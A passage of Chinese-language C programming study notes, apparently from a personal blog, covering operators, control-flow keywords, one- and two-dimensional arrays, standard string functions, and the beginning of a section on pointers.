<h3 id="右值"><a href="#右值" class="headerlink" title="右值"></a>右值</h3><p>赋值运算右边的那个式子，叫做右值</p>
<ul>
<li>右值可以是任何合法的C语言表达式</li>
</ul>
<h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><p><code>~</code> 按位逻辑取反</p>
<blockquote>
<p>有1则0 有0则1</p>
</blockquote>
<p><code>&amp;</code> 按位逻辑与</p>
<blockquote>
<p>全1则1 有0则0</p>
</blockquote>
<ul>
<li>任何二进制跟1按位与，结果保持不变</li>
<li>任何二进制跟0按位与，结果一定是0</li>
</ul>
<p><code>|</code> 按位逻辑或</p>
<blockquote>
<p>有1则1 全0则0</p>
</blockquote>
<ul>
<li>任何二进制跟0按位或，结果保持不变</li>
<li>任何二进制跟1按位或，结果一定是1</li>
</ul>
<p><code>^</code> 按位逻辑异或</p>
<blockquote>
<p>异则1 同则0</p>
</blockquote>
<ul>
<li>任何一个数跟自己异或，结果是0</li>
<li>任何一个数跟1异或，结果是把这个数最低的二进制反转</li>
<li>任何一个数跟0异或，结果保持不变</li>
</ul>
<blockquote>
<p>求异或后取反可以表示<code>逻辑同或</code></p>
</blockquote>
<h2 id="三目运算符"><a href="#三目运算符" class="headerlink" title="三目运算符"></a>三目运算符</h2><p><code>? :</code></p>
<blockquote>
<p>表达式1?表达式2:表达式3</p>
</blockquote>
<ul>
<li>表达式1为真返回表达式2</li>
<li>表达式1为假返回表达式3</li>
</ul>
<h2 id="其它运算符-UnDone"><a href="#其它运算符-UnDone" class="headerlink" title="其它运算符[!UnDone]"></a>其它运算符[!UnDone]</h2><p><code>++</code> 自增</p>
<p>前置自增</p>
<blockquote>
<p><code>++a;</code>先把a的值加1，然后使用加1之后的结果</p>
</blockquote>
<p>后置自增</p>
<blockquote>
<p><code>a++;</code>，先使用a原本的值，然后再把a加1</p>
</blockquote>
<p><code>--</code> 自减</p>
<p>前置自减</p>
<blockquote>
<p><code>--a;</code>先把a的值减1，然后使用减1之后的结果</p>
</blockquote>
<p>后置自减</p>
<blockquote>
<p><code>a--;</code>，先使用a原本的值，然后再把a减1</p>
</blockquote>
<p><code>,</code>  逗号表达式</p>
<p><code>变量=(表达式1,表达式2,表达式3...);</code></p>
<blockquote>
<p>从左到右计算，最后的结果由最右边的表达式来决定</p>
</blockquote>
<p><code>+=</code> <code>-=</code> <code>*=</code> <code>/=</code> <code>%=</code> <code>&lt;&lt;=</code> <code>&gt;&gt;=</code> <code>&amp;=</code> <code>|=</code> <code>^=</code> 组合运算符</p>
<blockquote>
<p><code>a += b;</code> 等价于 <code>a = a + b;</code></p>
</blockquote>
<p><code>sizeof</code> 取变量类型大小</p>
<blockquote>
<p>sizeof括号内的表达式不会执行，sizeof只会去取表达式结果的类型</p>
</blockquote>
<ul>
<li>如<code>sizeof(i++);</code>执行后i值不变</li>
</ul>
<p><code>&lt;&lt;</code> 左移</p>
<blockquote>
<p>把一个整数的二进制向左边移动若干位(舍弃高位)，低位补0</p>
</blockquote>
<p><code>&gt;&gt;</code> 右移</p>
<blockquote>
<p>不同的操作系统采用不同的右移方式</p>
</blockquote>
<ul>
<li>逻辑右移:把一个整数的二进制向右边移动若干位(舍弃低位),高位补0</li>
<li>算术右移:把一个整数的二进制向右边移动若干位(舍弃低位),高位补符号位的拷贝</li>
</ul>
<p><code>.</code> <code>-&gt;</code> 成员运算符</p>
<p><code>&amp;</code> 取地址 </p>
<blockquote>
<p>获取变量在内存中的地址</p>
</blockquote>
<p><code>*</code> 解引用</p>
<blockquote>
<p>获取地址中保存的内容</p>
</blockquote>
<h2 id="运算符的优先级-UnDone"><a href="#运算符的优先级-UnDone" class="headerlink" title="运算符的优先级[!UnDone]"></a>运算符的优先级[!UnDone]</h2><hr>
<h1 id="程序控制关键字"><a href="#程序控制关键字" class="headerlink" title="程序控制关键字"></a>程序控制关键字</h1><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><blockquote>
<p>循环内的变量都属于静态局部变量，循环外不可使用，循环内的定义不会导致重复定义</p>
</blockquote>
<h3 id="FOR循环"><a href="#FOR循环" class="headerlink" title="FOR循环"></a>FOR循环</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(表达式<span class="number">1</span>; 表达式<span class="number">2</span>; 表达式<span class="number">3</span>) <span class="comment">// 循环控制 表达式分别都可以省略</span></span><br><span class="line">&#123;</span><br><span class="line">		<span class="comment">// 循环体代码块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>先执行表达式1</li>
<li>再判断表达式2是否成立</li>
</ol>
<ul>
<li>表达式2成立：执行花括号里面的代码，然后执行表达式3，继续判断表达式2</li>
<li>表达式2不成立：结束循环</li>
</ul>
<h3 id="WHILE循环"><a href="#WHILE循环" class="headerlink" title="WHILE循环"></a>WHILE循环</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(条件表达式)  <span class="comment">//循环控制</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">// 循环体代码块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>条件为真，则执行循环，循环完成一轮后重新判断条件是否成立，若为假退出循环</li>
</ul>
<h3 id="DOWHILE循环"><a href="#DOWHILE循环" class="headerlink" title="DOWHILE循环"></a>DOWHILE循环</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">// 循环体代码块</span></span><br><span class="line">&#125;<span class="keyword">while</span>(条件表达式);</span><br></pre></td></tr></table></figure>

<ul>
<li>循环一定会至少执行一次</li>
<li>条件为真，则继续执行循环，循环完成一轮后重新判断条件是否成立，若为假退出循环</li>
</ul>
<h3 id="循环控制关键字"><a href="#循环控制关键字" class="headerlink" title="循环控制关键字"></a>循环控制关键字</h3><ul>
<li><code>break</code>   提前彻底结束循环</li>
<li><code>continue</code>  结束本次循环，继续后面的循环</li>
</ul>
<h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><h3 id="if-else-if-else多分支"><a href="#if-else-if-else多分支" class="headerlink" title="if-else if-else多分支"></a>if-else if-else多分支</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(条件判断式)&#123;</span><br><span class="line">		<span class="comment">//分支1</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(条件判断式<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="comment">//分支2</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="comment">//分支3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>分支只有的一句话的时候可以省略花括号</li>
<li>else永远和距离最近的if配对</li>
<li>关键字与花括号之间不能有除空格或回车以外的其他字符</li>
</ul>
<h3 id="选择分支"><a href="#选择分支" class="headerlink" title="选择分支"></a>选择分支</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>(变量)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">         <span class="comment">// 分支1</span></span><br><span class="line">         <span class="keyword">break</span>;     <span class="comment">// 结束case语句</span></span><br><span class="line">   <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">         <span class="comment">// 分支2  继续往下执行</span></span><br><span class="line">   <span class="keyword">default</span>: <span class="comment">// 不符合case列举除的情况则执行</span></span><br><span class="line">         <span class="comment">// 分支3</span></span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>switch-case中的变量，只能是整数，字符，枚举这些类型</li>
<li>default与break都是可选项，default可以随意调整位置</li>
<li>case中的分支可以用花括号包裹，如果在case中定义新变量则必须使用花括号包裹</li>
</ul>
<h3 id="三目分支"><a href="#三目分支" class="headerlink" title="?:三目分支"></a>?:三目分支</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">条件判断式 ? 分支<span class="number">1</span> : 分支<span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<h3 id="跳转分支"><a href="#跳转分支" class="headerlink" title="跳转分支"></a>跳转分支</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LabelName:</span><br><span class="line">	<span class="comment">// 语句</span></span><br><span class="line">	<span class="keyword">goto</span> LabelName; </span><br></pre></td></tr></table></figure>

<ul>
<li>标签下不可以定义新的变量(重复定义)</li>
<li>goto只能在同一个函数内部跳转</li>
</ul>
<hr>
<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>当需要保存一定数量的相同类型的数据时，就需要用到数组</p>
<blockquote>
<p>任何合法的C语言类型，都可以定义成数组</p>
</blockquote>
<h2 id="数组定义"><a href="#数组定义" class="headerlink" title="数组定义"></a>数组定义</h2><p><strong><code>[数据类型] &#123;数组名&#125;[数组元素个数]</code></strong></p>
<blockquote>
<p><code>数组名</code>出现在表达式中，本身就是一个指针, 一个指向本数组首元素地址的指针<br><code>&amp;数组名</code> 表示的是指向整个数组的一个指针(数组指针)</p>
</blockquote>
<h2 id="数组初始化以及赋值"><a href="#数组初始化以及赋值" class="headerlink" title="数组初始化以及赋值"></a>数组初始化以及赋值</h2><ul>
<li><strong>完全初始化</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">5</span>]=&#123;<span class="number">45</span>,<span class="number">85</span>,<span class="number">74</span>,<span class="number">96</span>,<span class="number">63</span>&#125;;  </span><br><span class="line"><span class="type">char</span> b[<span class="number">10</span>]=<span class="string">&quot;hello&quot;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>部分初始化</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">5</span>]=&#123;<span class="number">45</span>,<span class="number">25</span>&#125;;              </span><br><span class="line"><span class="type">char</span> b[<span class="number">10</span>]=&#123;<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>&#125;; <span class="comment">// &#x27;h&#x27; 表示单个字符</span></span><br><span class="line"><span class="type">char</span> s[<span class="number">20</span>]=&#123;<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="number">0</span>&#125;  <span class="comment">// \0的ASCII码就是0 &#123;0&#125;即等价于&#123;’\0’&#125; </span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>其它没有初始化的都是0</p>
</blockquote>
<ul>
<li><strong>自适应长度初始化</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[]=&#123;<span class="number">85</span>,<span class="number">96</span>&#125;;      </span><br><span class="line"><span class="type">char</span> b[]=<span class="string">&quot;world&quot;</span> <span class="comment">// &quot;world&quot; 表示字符串 多个字符</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>只能在定义数组的时候立马初始化才可行</p>
</blockquote>
<ul>
<li><strong>延迟赋值</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">3</span>];    <span class="comment">//定义了数组，但是没有初始化</span></span><br><span class="line">a[<span class="number">0</span>]=<span class="number">45</span>;     <span class="comment">//正确</span></span><br><span class="line">a[<span class="number">1</span>]=<span class="number">85</span>;     <span class="comment">//正确</span></span><br><span class="line">a[<span class="number">3</span>]=<span class="number">88</span>;     <span class="comment">//数组越界</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>分块初始化</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> b[<span class="number">100</span>] = &#123;[<span class="number">0</span> ... <span class="number">49</span>]=<span class="number">100</span>, [<span class="number">50</span> ... <span class="number">99</span>]=<span class="number">200</span>&#125;; </span><br><span class="line"><span class="comment">//把数组前面50个元素初始化为100，后面50个初始化为200</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>...</code> 左右两边必须要有空格</p>
</blockquote>
<h3 id="数组重复写入"><a href="#数组重复写入" class="headerlink" title="数组重复写入"></a>数组重复写入</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,buf);  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// buf的值 (0表示\0)</span></span><br><span class="line"><span class="comment">// abcdefg0 </span></span><br><span class="line"><span class="comment">// hijk0fg0</span></span><br><span class="line"><span class="comment">// lm0k0fg0</span></span><br></pre></td></tr></table></figure>

<h2 id="数组访问"><a href="#数组访问" class="headerlink" title="数组访问"></a>数组访问</h2><p>通过下标来对数组进行读或写</p>
<h3 id="数组指针访问"><a href="#数组指针访问" class="headerlink" title="数组指针访问"></a>数组指针访问</h3><p><code>*(p+n)</code> 等价于 <code>p[n]</code></p>
<blockquote>
<p>假如第一次输入的字符串长一点，下一次输入的字符串短一点，scanf都会自动帮你在字符串后面添加\0保存到buf中，短一点的字符串覆盖长字符串的前面部分，并且有个\0在后面(易忽略)</p>
</blockquote>
<h3 id="数组清空"><a href="#数组清空" class="headerlink" title="数组清空"></a>数组清空</h3><blockquote>
<p>若是在使用前不对数组进行清空，则有可能会有残留的不确定的值还存留在数组涵盖的范围内(如上所示)，导致程序运行时产生不确定的结果</p>
</blockquote>
<ul>
<li><code>void bzero(void *s, size_t n);</code></li>
</ul>
<p>s:数组名 n:数组大小</p>
<ul>
<li>初始化时利用 <code>int buf[10]=&#123;0&#125;;</code></li>
</ul>
<p>利用部分初始化把数组清零,-其它没有初始化的默认都是0</p>
<h3 id="数组越界"><a href="#数组越界" class="headerlink" title="数组越界"></a>数组越界</h3><p>数组的下标范围是从0到数组的长度-1，若是访问的时候下标不在该范围内，就会出现数组越界，有可能会导致段错误(Segmentation fault)，越界也分为往前越界和往后越界</p>
<h3 id="段错误"><a href="#段错误" class="headerlink" title="段错误"></a>段错误</h3><p>由于程序员在代码中访问了非法地址导致的(经常见于指针没有初始化，数组越界)</p>
<h3 id="数组怪异的写法"><a href="#数组怪异的写法" class="headerlink" title="数组怪异的写法"></a>数组怪异的写法</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> buf[<span class="number">10</span>];</span><br><span class="line"><span class="number">0</span>[buf]=<span class="number">11</span>; <span class="comment">//等价于buf[0]=11; </span></span><br></pre></td></tr></table></figure>

<h3 id="数组取地址的写法-易混淆"><a href="#数组取地址的写法-易混淆" class="headerlink" title="数组取地址的写法(易混淆)"></a>数组取地址的写法(易混淆)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数组 int a[10]</span></span><br><span class="line">a       <span class="comment">// int *类型的指针</span></span><br><span class="line">&amp;a      <span class="comment">// 数组指针  </span></span><br><span class="line">a[<span class="number">0</span>]    <span class="comment">// 非指针，数组首元素值</span></span><br><span class="line">&amp;a[<span class="number">0</span>]   <span class="comment">// 数组首元素的地址</span></span><br><span class="line">a+<span class="number">1</span>     <span class="comment">// 加类型的大小  4个字节(int)</span></span><br><span class="line">&amp;a+<span class="number">1</span>    <span class="comment">// 加的是整个数组的大小(10*4)</span></span><br><span class="line">a[<span class="number">0</span>]+<span class="number">1</span>  <span class="comment">// 把a[0]的值加1</span></span><br><span class="line">&amp;a[<span class="number">0</span>]+<span class="number">1</span> <span class="comment">// 加类型的大小  4个字节(int)</span></span><br></pre></td></tr></table></figure>

<h2 id="数组指针"><a href="#数组指针" class="headerlink" title="数组指针"></a>数组指针</h2><p>指向某个数组的指针</p>
<p> <code>**类型 (*指针名)[数组元素个数]**</code></p>
<h3 id="数组指针的定义"><a href="#数组指针的定义" class="headerlink" title="数组指针的定义"></a>数组指针的定义</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line"><span class="type">char</span> b[<span class="number">15</span>];</span><br><span class="line"><span class="type">int</span> c[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span> (*p)[<span class="number">10</span>]=&amp;a;    <span class="comment">//定义了 int[10]类型的数组指针，指向a</span></span><br><span class="line">p=&amp;c;               <span class="comment">//p又转而指向同类型，不同地址的c</span></span><br><span class="line"><span class="type">char</span> (*q)[<span class="number">15</span>]=&amp;b;   <span class="comment">//定义了 char[15]类型的数组指针，指向b</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>同类型的数组指针仍然可以直接赋值，反之不行</p>
</blockquote>
<h3 id="同数组的指针相减"><a href="#同数组的指针相减" class="headerlink" title="同数组的指针相减"></a>同数组的指针相减</h3><p>表示的是数组中两个指针之间间隔了多少个数据</p>
<h2 id="数组存储"><a href="#数组存储" class="headerlink" title="数组存储"></a>数组存储</h2><p>数组在计算机中是连续存储(数组元素的地址是紧挨着的)</p>
<h3 id="字符串存储"><a href="#字符串存储" class="headerlink" title="字符串存储"></a>字符串存储</h3><p>字符串默认有一个结束标记\0(ASCII码值就是0)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> buf1[<span class="number">10</span>]=<span class="string">&quot;hello&quot;</span>; <span class="comment">//会自动在字符串的末尾添加\0</span></span><br><span class="line"><span class="type">char</span> buf2[<span class="number">5</span>]=<span class="string">&quot;hello&quot;</span>; <span class="comment">//没有空位自动添加\0</span></span><br><span class="line"><span class="type">char</span> buf[]=&#123;<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>&#125;; <span class="comment">// 属于字符数组存储 sizeof结果为5,没有加\0</span></span><br><span class="line"><span class="type">char</span> buf[]=<span class="string">&quot;hello&quot;</span>  <span class="comment">// 属于字符串存储 sizeof结果为6，加上了\0</span></span><br></pre></td></tr></table></figure>

<h2 id="一维数组大小"><a href="#一维数组大小" class="headerlink" title="一维数组大小"></a>一维数组大小</h2><p><code>sizeof();</code></p>
<blockquote>
<p>求任何类型数据的大小的<strong>运算符</strong>，若是计算字符串的长度，则会算上\0</p>
</blockquote>
<p><code>size_t strlen(const char *s);</code></p>
<blockquote>
<p>专门(只能)用来求字符串的实际长度的<strong>函数</strong>，使用时需要导入<code>#include &lt;string.h&gt;</code></p>
</blockquote>
<p>返回值：字符串的实际长度(不包括\0)  s:要计算长度的字符串<br>原理：计算字符串实际长度，遇到\0认为字符串结束了</p>
<blockquote>
<p>%s打印字符串的时候，也是遇到\0就认为字符串结束了</p>
</blockquote>
<hr>
<h1 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h1><p>用二维的方式存放大量相同类型的数据</p>
<h2 id="二维数组定义"><a href="#二维数组定义" class="headerlink" title="二维数组定义"></a>二维数组定义</h2><p><code>**[数据类型] &#123;数组名&#125;[行数][列数]**</code></p>
<p>任何合法的C语言类型，都可以定义成二维数组</p>
<blockquote>
<p><code>二维数组名</code>在表达式中代表该数组首元素的地址 相当于一个指向本数组首元素地址的指针<br><code>&amp;二维数组名</code>表示的是指向整个数组的一个指针(数组指针)</p>
</blockquote>
<h2 id="二维数组初始化和赋值"><a href="#二维数组初始化和赋值" class="headerlink" title="二维数组初始化和赋值"></a>二维数组初始化和赋值</h2><ul>
<li><strong>部分初始化</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">5</span>][<span class="number">6</span>]=&#123;<span class="number">45</span>,<span class="number">78</span>,<span class="number">96</span>&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>其它没有初始化的默认全部都是0</p>
</blockquote>
<ul>
<li><strong>自适应行数初始化</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[][<span class="number">6</span>]=&#123;<span class="number">89</span>,<span class="number">9</span>&#125;;                   <span class="comment">//正确</span></span><br><span class="line"><span class="type">char</span> b[][<span class="number">10</span>]=&#123;<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;world&quot;</span>,<span class="string">&quot;gec&quot;</span>&#125;;<span class="comment">//正确</span></span><br><span class="line"><span class="type">int</span> a[][]=&#123;<span class="number">89</span>,<span class="number">9</span>&#125;;                    <span class="comment">//错误</span></span><br><span class="line"><span class="type">int</span> a[<span class="number">5</span>][]=&#123;<span class="number">89</span>,<span class="number">9</span>&#125;;                   <span class="comment">//错误</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>不能自适应行列数是因为编译器无法正确确定行列排布方式，具有二义性</p>
</blockquote>
<ul>
<li><strong>分组初始化</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> b[<span class="number">3</span>][<span class="number">10</span>]=&#123;&#123;<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>&#125;,&#123;<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;&#125;   <span class="comment">//正确</span></span><br><span class="line"><span class="type">int</span> a[<span class="number">5</span>][<span class="number">6</span>]=&#123;&#123;<span class="number">5</span>&#125;,<span class="number">8</span>,<span class="number">9</span>,&#123;<span class="number">89</span>,<span class="number">63</span>&#125;&#125;;                        <span class="comment">//错误</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>要求从左到右连续分组，中间不要间断</p>
</blockquote>
<ul>
<li><strong>单独初始化</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分别赋值</span></span><br><span class="line"><span class="type">int</span> a[<span class="number">5</span>][<span class="number">6</span>];  </span><br><span class="line">a[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">99</span>;</span><br><span class="line">a[<span class="number">1</span>][<span class="number">2</span>]=<span class="number">67</span>;</span><br><span class="line"><span class="type">char</span> b[<span class="number">3</span>][<span class="number">10</span>];</span><br><span class="line">b[<span class="number">0</span>][<span class="number">1</span>]=<span class="string">&#x27;h&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="二维数组的访问"><a href="#二维数组的访问" class="headerlink" title="二维数组的访问"></a>二维数组的访问</h2><p>行和列的下标：都是从0开始,注意越界问题</p>
<h3 id="二维数组的指针访问"><a href="#二维数组的指针访问" class="headerlink" title="二维数组的指针访问"></a>二维数组的指针访问</h3><p><code>*(*(a+i)+j)</code>等价于 <code>*(a[i]+j)</code>等价于<code>a[i][j]</code></p>
<h2 id="二维数组的存储"><a href="#二维数组的存储" class="headerlink" title="二维数组的存储"></a>二维数组的存储</h2><p>二维数组在计算机中是连续存储(数组元素的地址是紧挨着的)</p>
<blockquote>
<p>可以把它看作是特殊的”一维数组”<br>可以把二维数组拆分成多个一维数组</p>
</blockquote>
<h2 id="二维数组占用空间大小"><a href="#二维数组占用空间大小" class="headerlink" title="二维数组占用空间大小"></a>二维数组占用空间大小</h2><p>依据初始化列表中值的个数 (行下标为空的情况下)，确定有几行,再通过 <strong>行<em>列</em>sizeof(类型)</strong> 确定大小</p>
<h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><p>字符串的本质就是<code>**char 字符串名[字符串长度]</code>** </p>
<p>各类字符串的操作函数都需要先引入<code>#include &lt;string.h&gt;</code></p>
<h2 id="复制、拷贝字符串"><a href="#复制、拷贝字符串" class="headerlink" title="复制、拷贝字符串"></a>复制、拷贝字符串</h2><p><code>char *strcpy(char *dest, const char *src);</code></p>
<blockquote>
<p>把src中的字符串拷贝一份到dest里</p>
</blockquote>
<ul>
<li>strcpy拷贝字符串会自动在后面加上\0(特别是src比dest要短的情况下)</li>
</ul>
<p><code>char *strncpy(char *dest, const char *src, size_t n);</code></p>
<blockquote>
<p>把src中的字符串拷贝一份到dest里面，拷贝n个字节</p>
</blockquote>
<ul>
<li>strncpy拷贝字符串的时候不会自动添加\0</li>
</ul>
<h2 id="字符串的比较"><a href="#字符串的比较" class="headerlink" title="字符串的比较"></a>字符串的比较</h2><blockquote>
<p>比较标准：按照两个字符串中字符的ASCII码排列顺序来比较</p>
</blockquote>
<p><code>int strcmp(const char *s1, const char *s2);</code></p>
<ul>
<li>参数：s1 s2就是你要比较的两个字符串</li>
</ul>
<p>返回值：</p>
<ul>
<li>s1大于s2  返回值&gt;0</li>
<li>s1小于s2  返回值&lt;0</li>
<li>s1等于s2  返回0</li>
</ul>
<p><code>int strncmp(const char *s1, const char *s2, size_t n);</code></p>
<ul>
<li>参数：比较s1和s2的最前面的n个字符是否相同</li>
</ul>
<h2 id="字符串合并，拼接"><a href="#字符串合并，拼接" class="headerlink" title="字符串合并，拼接"></a>字符串合并，拼接</h2><p><code>char *strcat(char *dest, const char *src);</code></p>
<ul>
<li>参数：把src合并到dest中，合并的结果存放到dest中</li>
</ul>
<p><code>char *strncat(char *dest, const char *src, size_t n);</code></p>
<blockquote>
<p>注意：dest总的大小必须要超过dest字符串+src字符串之和</p>
</blockquote>
<p><code>int sprintf(char *str, const char *format, ...);</code></p>
<ul>
<li>参数：str：保存拼接之后的字符串 format：格式控制字符串</li>
</ul>
<h2 id="字符串的切割"><a href="#字符串的切割" class="headerlink" title="字符串的切割"></a>字符串的切割</h2><p><code>char *strtok(char *str, const char *delim);</code></p>
<blockquote>
<p>底层原理:strtok会改变原始字符串，strtok会把原始字符串中遇到的切割符号替换成\0</p>
</blockquote>
<blockquote>
<p>第一次使用的时候str填原始字符串 之后使用时该参数为NULL</p>
</blockquote>
<ul>
<li>参数：str：你要切割的字符串  delim：切割的标准</li>
</ul>
<p>返回值：</p>
<ul>
<li>切割成功返回切割得到的子串</li>
<li>字符串切割完毕或者切割过程中发了错误，返回NULL</li>
</ul>
<h2 id="判断子串"><a href="#判断子串" class="headerlink" title="判断子串"></a>判断子串</h2><p><code>char *strchr(const char *s, int c);</code></p>
<ul>
<li>参数：s ：你要查找的字符串  c：你要找的字符</li>
</ul>
<p>返回值：</p>
<ul>
<li>返回字符c首次在s中出现的位置</li>
<li>如果没有出现，返回NULL</li>
</ul>
<p><code>char *strstr(const char *haystack, const char *needle);</code></p>
<blockquote>
<p>实际用途：判断文件类型</p>
</blockquote>
<h2 id="二维数组名的写法-易混淆"><a href="#二维数组名的写法-易混淆" class="headerlink" title="二维数组名的写法(易混淆)"></a>二维数组名的写法(易混淆)</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">a          <span class="comment">// 二维数组首元素的地址-&gt;  a[0]的地址,数组指针  int (*p)[10]</span></span><br><span class="line">&amp;a         <span class="comment">// 数组指针    int (*p)[7][10]  </span></span><br><span class="line">a[<span class="number">0</span>]       <span class="comment">// 第一个一维数组int[10]的名字，表示该数组首元素a[0][0]的地址  int *</span></span><br><span class="line">&amp;a[<span class="number">0</span>]      <span class="comment">// 数组指针    int (*p)[10]</span></span><br><span class="line">a[<span class="number">0</span>][<span class="number">0</span>]    <span class="comment">// 非指针</span></span><br><span class="line">&amp;a[<span class="number">0</span>][<span class="number">0</span>]   <span class="comment">// int *</span></span><br><span class="line">a+<span class="number">1</span>        <span class="comment">// 加类型的大小  int[10]大小</span></span><br><span class="line">&amp;a+<span class="number">1</span>       <span class="comment">// 加的是整个数组的大小,int[7][10]大小</span></span><br><span class="line">a[<span class="number">0</span>]+<span class="number">1</span>     <span class="comment">// 4个字节</span></span><br><span class="line">&amp;a[<span class="number">0</span>]+<span class="number">1</span>    <span class="comment">// 加类型的大小  int[10]大小</span></span><br><span class="line">a[<span class="number">0</span>][<span class="number">0</span>]+<span class="number">1</span>  <span class="comment">// 把数据加1</span></span><br><span class="line">&amp;a[<span class="number">0</span>][<span class="number">0</span>]+<span class="number">1</span> <span class="comment">// 4个字节</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h1><p>用来存放变量在内存中的地址首地址，使用指针可以间接访问地址中的变量值，指针的大小跟指针的类型没有任何关系，只跟操作系统的位数有关。在32位系统上，所有的指针大小都是4个字节，在64位系统上，所有的指针大小都是8个字节，指针是来存放变量在内存中的首地址的，而64位系统上所有的地址长度都是8个字节</p>
<blockquote>
<p>首地址:在一定地址范围中地址值最小的那个，就是该地址范围的首地址</p>
</blockquote>
<h2 id="指针定义"><a href="#指针定义" class="headerlink" title="指针定义"></a>指针定义</h2><p><code>**[数据类型] *指针名**</code></p>
<blockquote>
<p>指针本身也是一个变量，只是这个变量存储的是地址值</p>
</blockquote>
<h2 id="指针类型转换"><a href="#指针类型转换" class="headerlink" title="指针类型转换"></a>指针类型转换</h2><p><code>指针1=(指针类型)指针2</code></p>
<p>当两个指针类型不一致的时候又需要传值的时候，就需要强制转换</p>
<h2 id="指针初始化和赋值"><a href="#指针初始化和赋值" class="headerlink" title="指针初始化和赋值"></a>指针初始化和赋值</h2><ul>
<li><strong>立即初始化</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">99</span>;</span><br><span class="line"><span class="type">int</span> *p=&amp;a;  <span class="comment">//定义了指针p，p里面存放变量a在内存中地址</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>延迟初始化</strong></li>
</ul>
